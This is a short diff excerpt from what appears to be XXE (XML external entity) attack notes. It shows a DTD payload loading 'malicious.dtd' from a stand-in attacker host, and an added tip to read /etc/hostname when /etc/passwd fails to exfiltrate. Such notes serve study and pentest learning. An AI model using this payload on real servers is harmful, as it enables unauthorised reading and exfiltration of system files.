@@ -13,5 +13,6 @@ once we have our malicious server setup we can request external entities like th
 "http://web-attacker.com/malicious.dtd"> %xxe;]>
 
 which can give us desired output
+sometimes /etc/password may not work as it may have multiple lines with newline then we can use /etc/hostname wi=hich contains single lines
 
 2.
